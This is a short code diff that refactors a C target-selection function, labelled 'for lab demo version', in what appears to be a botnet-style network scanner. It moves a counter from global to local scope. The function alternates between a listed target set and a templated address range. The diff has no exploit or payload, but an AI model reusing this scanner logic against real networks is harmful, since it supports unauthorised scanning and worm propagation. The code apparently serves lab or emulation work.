@@ -155,8 +155,6 @@ ipv4_t get_next_target_v2(void) // for lab demo version
     return next_addr;
 }
 
-static int g_count = 0;
-
 ipv4_t get_next_target_v3(void) // for lab demo version
 {   
     char sz_addrbuff_bgn[16] = "{ip_prx}.{tgt_bgn}";
@@ -167,10 +165,11 @@ ipv4_t get_next_target_v3(void) // for lab demo version
     if(local_addr != ip_bgn)
         return 0;
 
-    g_count++;
+    static int s_count = 0;
+    s_count++;
     ipv4_t next_addr;
 
-    if(g_count%2==0)
+    if(s_count%2==0)
     {
         next_addr = g_target_ips[rand_next() % g_target_ips_num];
         while(next_addr == local_addr)
@@ -188,7 +187,7 @@ ipv4_t get_next_target_v3(void) // for lab demo version
     }
 
 #ifdef DEBUG
-    printf("[scanner] [%d] next_addr %d.%d.%d.%d\n", g_count, next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
+    printf("[scanner] [%d] next_addr %d.%d.%d.%d\n", s_count, next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
 #endif
     return next_addr;
 }
